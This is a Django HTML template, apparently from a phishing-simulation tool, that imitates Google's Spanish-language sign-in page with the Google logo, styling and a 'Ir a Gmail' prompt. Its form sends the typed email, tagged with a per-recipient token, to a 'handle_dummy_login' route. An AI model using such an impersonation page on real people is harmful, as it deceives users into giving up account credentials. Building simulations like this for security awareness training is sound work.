<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Cuentas de Google</title>
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify_content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .card {
            width: 450px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            box-sizing: border-box;
            text-align: center;
        }

        .logo {
            margin-bottom: 10px;
        }

        .logo img {
            height: 24px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 10px;
            margin-top: 0;
            color: #202124;
        }

        .subtitle {
            font-size: 16px;
            font-weight: 400;
            letter-spacing: .1px;
            line-height: 1.5;
            margin-bottom: 30px;
            color: #202124;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            height: 50px;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            margin-bottom: 20px;
            box-sizing: border-box;
            font-size: 16px;
        }

        .btn-primary {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 0 24px;
            height: 36px;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            float: right;
        }

        .btn-primary:hover {
            background-color: #2b7de9;
            box-shadow: 0 1px 2px 0 rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
        }
    </style>
</head>

<body>
    <div class="card">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
        </div>
        <h1>Iniciar sesión</h1>
        <div class="subtitle">Ir a Gmail</div>

        <form action="{% url 'handle_dummy_login' token %}" method="post" style="text-align: left;">
            {% csrf_token %}
            <input type="email" name="email" placeholder="Correo electrónico o teléfono" required>

            <p style="color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer;">¿Has olvidado tu correo
                electrónico?</p>

            <div
                style="margin-top: 40px; overflow: hidden; display: flex; justify-content: space-between; align-items: center;">
                <span style="color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer;">Crear cuenta</span>
                <button type="submit" class="btn-primary">Siguiente</button>
            </div>
        </form>
    </div>
</body>

</html>
